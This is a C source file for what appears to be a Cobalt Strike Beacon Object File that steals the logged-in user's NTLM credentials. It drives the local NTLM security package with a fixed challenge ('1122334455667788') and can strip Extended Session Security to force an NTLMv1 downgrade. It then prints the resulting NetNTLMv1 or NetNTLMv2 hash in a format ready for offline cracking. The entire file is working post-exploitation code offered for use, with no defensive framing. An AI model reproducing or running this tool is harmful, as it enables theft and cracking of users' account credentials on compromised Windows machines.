#define SECURITY_WIN32
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security.h>
#include <stdint.h>
#include "beacon.h"

WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *_Str);
WINBASEAPI _CRTIMP int __cdecl MSVCRT$sscanf_s(const char *_Src,const char *_Format,...);
WINBASEAPI int __cdecl MSVCRT$sprintf(char *__stream, const char *__format, ...);
WINBASEAPI void *__cdecl MSVCRT$calloc(size_t _NumOfElements, size_t _SizeOfElements);
WINBASEAPI void *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
WINBASEAPI void __cdecl MSVCRT$memset(void *dest, int c, size_t count);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$AcquireCredentialsHandleA(LPCTSTR, LPCTSTR, ULONG, PLUID, PVOID, SEC_GET_KEY_FN, PVOID, PCredHandle, PTimeStamp);
DECLSPEC_IMPORT SECURITY_STATUS WINAPI SECUR32$InitializeSecurityContextA(PCredHandle, PCtxtHandle, SEC_CHAR *, ULONG, ULONG, ULONG, PSecBufferDesc, ULONG, PCtxtHandle, PSecBufferDesc, PULONG, PTimeStamp);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$AcceptSecurityContext(PCredHandle phCredential, PCtxtHandle phContext, PSecBufferDesc pInput, ULONG fContextReq, ULONG TargetDataRep, PCtxtHandle phNewContext, PSecBufferDesc pOutput, ULONG *pfContextAttr, PTimeStamp ptsExpiry);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$FreeCredentialsHandle(PCredHandle phCredential);
WINBASEAPI SECURITY_STATUS WINAPI SECUR32$DeleteSecurityContext(PCtxtHandle phContext);

int my_isdigit(int c) {
    return (c >= '0' && c <= '9');
}

int my_islower(int c) {
    return (c >= 'a' && c <= 'z');
}

long int my_strtol(const char* str, char** endptr, int base) {
    long int result = 0;
    int sign = 1;

    if (*str == '-' || *str == '+') {
        sign = (*str == '-') ? -1 : 1;
        str++;
    }

    while (my_isdigit(*str) ||
           (base == 16 && (*str >= 'a' && *str <= 'f')) ||
           (base == 16 && (*str >= 'A' && *str <= 'F'))) {
        int digit = 0;
        if (my_isdigit(*str)) {
            digit = *str - '0';
        } else if (base == 16) {
            digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
        }

        if (digit >= base)
            break;

        if (result > (LONG_MAX - digit) / base) {
            return (sign == 1) ? LONG_MAX : LONG_MIN;
        }

        result = result * base + digit;
        str++;
    }

    if (endptr != NULL)
        *endptr = (char*)str;

    return result * sign;
}

#define MAX_TOKEN_SIZE 12288

BOOL IsCredHandleValid(CredHandle *phCred) {
    return phCred && (phCred->dwLower != (ULONG_PTR)-1) && (phCred->dwUpper != (ULONG_PTR)-1);
}

BOOL IsCtxtHandleValid(CtxtHandle *phCtx) {
    return phCtx && (phCtx->dwLower != (ULONG_PTR)-1) && (phCtx->dwUpper != (ULONG_PTR)-1);
}

BYTE* StringToByteArray(const char* hex) {
    if (!hex) return NULL;

    size_t numChars = MSVCRT$strlen(hex);
    if (numChars == 0 || (numChars % 2) != 0) {
        return NULL;
    }

    size_t outLen = numChars / 2;
    BYTE* bytes = (BYTE*)MSVCRT$calloc(outLen, sizeof(BYTE));
    if (!bytes) {
        return NULL;
    }

    for (size_t i = 0; i < outLen; ++i) {
        char buf[3] = { hex[i * 2], hex[i * 2 + 1], '\0' };
        char* endptr = NULL;
        long v = my_strtol(buf, &endptr, 16);
        if (endptr == buf || v < 0 || v > 0xFF) {
            MSVCRT$free(bytes);
            return NULL;
        }
        bytes[i] = (BYTE)v;
    }

    return bytes;
}

char* ByteArrayToString(const unsigned char* ba, size_t ba_length) {
    if (!ba) return NULL;

    char *hex = (char *)MSVCRT$calloc(ba_length * 2 + 1, sizeof(char));
    if (!hex) {
        return NULL;
    }

    for (size_t i = 0; i < ba_length; ++i) {
        MSVCRT$sprintf(hex + i * 2, "%02x", ba[i]);
    }
    hex[ba_length * 2] = '\0';
    return hex;
}

char* ByteArrayToUnicodeString(const BYTE* ba, size_t ba_length) {
    if (!ba || ba_length == 0) return NULL;

    size_t unicode_chars = ba_length / 2;
    char *str = (char *)MSVCRT$calloc(unicode_chars + 1, sizeof(char));
    if (!str) {
        return NULL;
    }

    for (size_t i = 0; i < unicode_chars; ++i) {
        str[i] = (char)ba[i * 2];
    }

    str[unicode_chars] = '\0';
    return str;
}

char* FormatNTLMv2Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* nt_resp, size_t nt_resp_len) {
    char *user_str = ByteArrayToUnicodeString(user, user_length);
    char *domain_str = ByteArrayToUnicodeString(domain, domain_length);
    if (!user_str || !domain_str) {
        if (user_str) MSVCRT$free(user_str);
        if (domain_str) MSVCRT$free(domain_str);
        return NULL;
    }

    char *nt1 = ByteArrayToString(nt_resp, 16);
    char *nt2 = (nt_resp_len > 16) ? ByteArrayToString(nt_resp + 16, nt_resp_len - 16) : ByteArrayToString((const unsigned char*)"", 0);
    if (!nt1 || !nt2) {
        MSVCRT$free(user_str);
        MSVCRT$free(domain_str);
        if (nt1) MSVCRT$free(nt1);
        if (nt2) MSVCRT$free(nt2);
        return NULL;
    }

    char *result = (char *)MSVCRT$calloc(512, sizeof(char));
    if (!result) {
        MSVCRT$free(user_str);
        MSVCRT$free(domain_str);
        MSVCRT$free(nt1);
        MSVCRT$free(nt2);
        return NULL;
    }

    MSVCRT$sprintf(result, "%s::%s:%s:%s:%s", user_str, domain_str, challenge, nt1, nt2);
    MSVCRT$free(user_str);
    MSVCRT$free(domain_str);
    MSVCRT$free(nt1);
    MSVCRT$free(nt2);
    return result;
}

char* FormatNTLMv1Hash(const char* challenge, const BYTE* user, size_t user_length, const BYTE* domain, size_t domain_length, const BYTE* lm_resp, size_t lm_resp_len, const BYTE* nt_resp, size_t nt_resp_len) {
    char *user_str = ByteArrayToUnicodeString(user, user_length);
    char *domain_str = ByteArrayToUnicodeString(domain, domain_length);
    if (!user_str || !domain_str) {
        if (user_str) MSVCRT$free(user_str);
        if (domain_str) MSVCRT$free(domain_str);
        return NULL;
    }

    char *lm_str = ByteArrayToString(lm_resp, lm_resp_len);
    char *nt_str = ByteArrayToString(nt_resp, nt_resp_len);
    if (!lm_str || !nt_str) {
        MSVCRT$free(user_str);
        MSVCRT$free(domain_str);
        if (lm_str) MSVCRT$free(lm_str);
        if (nt_str) MSVCRT$free(nt_str);
        return NULL;
    }

    char *result = (char *)MSVCRT$calloc(512, sizeof(char));
    if (!result) {
        MSVCRT$free(user_str);
        MSVCRT$free(domain_str);
        MSVCRT$free(lm_str);
        MSVCRT$free(nt_str);
        return NULL;
    }

    MSVCRT$sprintf(result, "%s::%s:%s:%s:%s", user_str, domain_str, lm_str, nt_str, challenge);
    MSVCRT$free(user_str);
    MSVCRT$free(domain_str);
    MSVCRT$free(lm_str);
    MSVCRT$free(nt_str);
    return result;
}

BYTE* GetSecBufferByteArray(const SecBufferDesc* pSecBufferDesc, size_t* pBufferSize) {
    if (!pSecBufferDesc || !pBufferSize || pSecBufferDesc->cBuffers != 1) {
        return NULL;
    }

    SecBuffer* pSecBuffer = pSecBufferDesc->pBuffers;
    if (!pSecBuffer || pSecBuffer->cbBuffer == 0 || !pSecBuffer->pvBuffer) {
        return NULL;
    }

    BYTE* buffer = (BYTE *)MSVCRT$calloc(pSecBuffer->cbBuffer, sizeof(BYTE));
    if (!buffer) {
        return NULL;
    }

    MSVCRT$memcpy(buffer, pSecBuffer->pvBuffer, pSecBuffer->cbBuffer);
    *pBufferSize = pSecBuffer->cbBuffer;
    return buffer;
}

void ParseNTResponse(BYTE* message, size_t message_len, const char* challenge) {
    if (!message || message_len < 48 || !challenge) {
        BeaconPrintf(CALLBACK_ERROR, "ParseNTResponse: invalid input\n");
        return;
    }

    uint16_t lm_resp_len = 0;
    uint32_t lm_resp_off = 0;
    uint16_t nt_resp_len = 0;
    uint32_t nt_resp_off = 0;
    uint16_t domain_len = 0;
    uint32_t domain_off = 0;
    uint16_t user_len = 0;
    uint32_t user_off = 0;

    MSVCRT$memcpy(&lm_resp_len, message + 12, sizeof(lm_resp_len));
    MSVCRT$memcpy(&lm_resp_off, message + 16, sizeof(lm_resp_off));
    MSVCRT$memcpy(&nt_resp_len, message + 20, sizeof(nt_resp_len));
    MSVCRT$memcpy(&nt_resp_off, message + 24, sizeof(nt_resp_off));
    MSVCRT$memcpy(&domain_len, message + 28, sizeof(domain_len));
    MSVCRT$memcpy(&domain_off, message + 32, sizeof(domain_off));
    MSVCRT$memcpy(&user_len, message + 36, sizeof(user_len));
    MSVCRT$memcpy(&user_off, message + 40, sizeof(user_off));

    #define VALID_RANGE(off, len) ((size_t)(off) + (size_t)(len) <= message_len)
    if (!VALID_RANGE(lm_resp_off, lm_resp_len) || !VALID_RANGE(nt_resp_off, nt_resp_len) ||
        !VALID_RANGE(domain_off, domain_len) || !VALID_RANGE(user_off, user_len)) {
        BeaconPrintf(CALLBACK_ERROR, "ParseNTResponse: invalid offsets\n");
        return;
    }

    BYTE* lm_resp = (BYTE *)MSVCRT$calloc(lm_resp_len ? lm_resp_len : 1, 1);
    BYTE* nt_resp = (BYTE *)MSVCRT$calloc(nt_resp_len ? nt_resp_len : 1, 1);
    BYTE* domain = (BYTE *)MSVCRT$calloc(domain_len ? domain_len : 1, 1);
    BYTE* user = (BYTE *)MSVCRT$calloc(user_len ? user_len : 1, 1);
    if (!lm_resp || !nt_resp || !domain || !user) {
        if (lm_resp) MSVCRT$free(lm_resp);
        if (nt_resp) MSVCRT$free(nt_resp);
        if (domain) MSVCRT$free(domain);
        if (user) MSVCRT$free(user);
        return;
    }

    if (lm_resp_len) MSVCRT$memcpy(lm_resp, message + lm_resp_off, lm_resp_len);
    if (nt_resp_len) MSVCRT$memcpy(nt_resp, message + nt_resp_off, nt_resp_len);
    if (domain_len) MSVCRT$memcpy(domain, message + domain_off, domain_len);
    if (user_len) MSVCRT$memcpy(user, message + user_off, user_len);

    char* netNTLM = NULL;
    if (nt_resp_len == 24) {
        netNTLM = FormatNTLMv1Hash(challenge, user, user_len, domain, domain_len, lm_resp, lm_resp_len, nt_resp, nt_resp_len);
        if (netNTLM) {
            BeaconPrintf(CALLBACK_OUTPUT, "NTLMv1 Response:\n%s\n", netNTLM);
            MSVCRT$free(netNTLM);
        }
    } else if (nt_resp_len > 24) {
        netNTLM = FormatNTLMv2Hash(challenge, user, user_len, domain, domain_len, nt_resp, nt_resp_len);
        if (netNTLM) {
            BeaconPrintf(CALLBACK_OUTPUT, "NTLMv2 Response:\n%s\n", netNTLM);
            MSVCRT$free(netNTLM);
        }
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Unknown NTLM response (nt_resp_len=%u)\n", nt_resp_len);
    }

    MSVCRT$free(lm_resp);
    MSVCRT$free(nt_resp);
    MSVCRT$free(domain);
    MSVCRT$free(user);
}

void GetNTLMCreds(const char* challenge, BOOL DisableESS) {
    SecBuffer ClientSecBuffer = { 0 };
    SecBuffer ServerSecBuffer = { 0 };
    SecBuffer ClientSecBuffer2 = { 0 };
    BYTE *serverMessage = NULL;
    BYTE *challengeBytes = NULL;

    CredHandle hCred;
    CtxtHandle hClientContext;
    CtxtHandle hServerContext;

    hCred.dwLower = (ULONG_PTR)-1;
    hCred.dwUpper = (ULONG_PTR)-1;
    hClientContext.dwLower = (ULONG_PTR)-1;
    hClientContext.dwUpper = (ULONG_PTR)-1;
    hServerContext.dwLower = (ULONG_PTR)-1;
    hServerContext.dwUpper = (ULONG_PTR)-1;

    if (!challenge) {
        BeaconPrintf(CALLBACK_ERROR, "GetNTLMCreds: challenge is NULL\n");
        return;
    }

    SecBufferDesc ClientToken = { SECBUFFER_VERSION, 1, &ClientSecBuffer };
    ClientSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
    ClientSecBuffer.pvBuffer = (BYTE *)MSVCRT$calloc(MAX_TOKEN_SIZE, 1);
    ClientSecBuffer.BufferType = SECBUFFER_TOKEN;

    SecBufferDesc ServerToken = { SECBUFFER_VERSION, 1, &ServerSecBuffer };
    ServerSecBuffer.cbBuffer = MAX_TOKEN_SIZE;
    ServerSecBuffer.pvBuffer = (BYTE *)MSVCRT$calloc(MAX_TOKEN_SIZE, 1);
    ServerSecBuffer.BufferType = SECBUFFER_TOKEN;

    if (!ClientSecBuffer.pvBuffer || !ServerSecBuffer.pvBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "GetNTLMCreds: failed to allocate token buffers\n");
        goto cleanup;
    }

    TimeStamp expiry = { 0 };
    ULONG contextAttr = 0;
    SECURITY_STATUS SecStatus;

    SecStatus = SECUR32$AcquireCredentialsHandleA(NULL, "NTLM", SECPKG_CRED_BOTH, NULL, NULL, 0, NULL, &hCred, &expiry);
    if (SecStatus != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "AcquireCredentialsHandle failed with %x\n", SecStatus);
        goto cleanup;
    }

    SecStatus = SECUR32$InitializeSecurityContextA(&hCred, NULL, NULL, ISC_REQ_CONNECTION, 0, SECURITY_NATIVE_DREP, NULL, 0, &hClientContext, &ClientToken, &contextAttr, &expiry);
    if (SecStatus != SEC_I_CONTINUE_NEEDED && SecStatus != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "InitializeSecurityContext (initial) failed with %x\n", SecStatus);
        goto cleanup;
    }

    SecStatus = SECUR32$AcceptSecurityContext(&hCred, NULL, &ClientToken, ISC_REQ_CONNECTION, SECURITY_NATIVE_DREP, &hServerContext, &ServerToken, &contextAttr, &expiry);
    if (SecStatus != SEC_E_OK && SecStatus != SEC_I_CONTINUE_NEEDED) {
        BeaconPrintf(CALLBACK_ERROR, "AcceptSecurityContext failed with %x\n", SecStatus);
        goto cleanup;
    }

    size_t serverMessageSize = 0;
    serverMessage = GetSecBufferByteArray(&ServerToken, &serverMessageSize);
    if (!serverMessage || serverMessageSize < 48) {
        BeaconPrintf(CALLBACK_ERROR, "GetNTLMCreds: failed to get server message\n");
        goto cleanup;
    }

    challengeBytes = StringToByteArray(challenge);
    if (!challengeBytes) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to convert challenge string\n");
        goto cleanup;
    }

    if (DisableESS) {
        serverMessage[22] &= 0xF7;
    }

    MSVCRT$memcpy(serverMessage + 24, challengeBytes, 8);
    MSVCRT$memset(serverMessage + 32, 0, 16);

    SecBuffer ServerSecBuffer2 = { (ULONG)serverMessageSize, SECBUFFER_TOKEN, serverMessage };
    ServerToken.pBuffers = &ServerSecBuffer2;

    ClientSecBuffer2.BufferType = SECBUFFER_TOKEN;
    ClientSecBuffer2.cbBuffer = MAX_TOKEN_SIZE;
    ClientSecBuffer2.pvBuffer = (BYTE *)MSVCRT$calloc(MAX_TOKEN_SIZE, 1);
    if (!ClientSecBuffer2.pvBuffer) {
        BeaconPrintf(CALLBACK_ERROR, "GetNTLMCreds: calloc failed for client output\n");
        goto cleanup;
    }
    ClientToken.pBuffers = &ClientSecBuffer2;

    SecStatus = SECUR32$InitializeSecurityContextA(&hCred, &hClientContext, NULL, ISC_REQ_CONNECTION, 0, SECURITY_NATIVE_DREP, &ServerToken, 0, &hClientContext, &ClientToken, &contextAttr, &expiry);
    if (SecStatus == SEC_E_OK) {
        size_t responseSize = 0;
        BYTE* response = GetSecBufferByteArray(&ClientToken, &responseSize);
        if (response && responseSize > 0) {
            ParseNTResponse(response, responseSize, challenge);
            MSVCRT$free(response);
        } else {
            BeaconPrintf(CALLBACK_ERROR, "GetNTLMCreds: client response empty\n");
        }
    } else if (SecStatus == SEC_E_NO_CREDENTIALS) {
        BeaconPrintf(CALLBACK_ERROR, "The NTLM security package does not contain any credentials\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "InitializeSecurityContext (client) failed: %x\n", SecStatus);
    }

cleanup:
    if (IsCredHandleValid(&hCred)) {
        SECUR32$FreeCredentialsHandle(&hCred);
    }
    if (IsCtxtHandleValid(&hClientContext)) {
        SECUR32$DeleteSecurityContext(&hClientContext);
    }
    if (IsCtxtHandleValid(&hServerContext)) {
        SECUR32$DeleteSecurityContext(&hServerContext);
    }
    if (ClientSecBuffer.pvBuffer) MSVCRT$free(ClientSecBuffer.pvBuffer);
    if (ServerSecBuffer.pvBuffer) MSVCRT$free(ServerSecBuffer.pvBuffer);
    if (ClientSecBuffer2.pvBuffer) MSVCRT$free(ClientSecBuffer2.pvBuffer);
    if (serverMessage) MSVCRT$free(serverMessage);
    if (challengeBytes) MSVCRT$free(challengeBytes);
}

void go(char* buf, int len) {
    BOOL DisableESS = FALSE;
    if (buf && len > 0) {
        datap parser;
        BeaconDataParse(&parser, buf, len);
        DisableESS = BeaconDataInt(&parser) ? TRUE : FALSE;
    }
    GetNTLMCreds("1122334455667788", DisableESS);
}
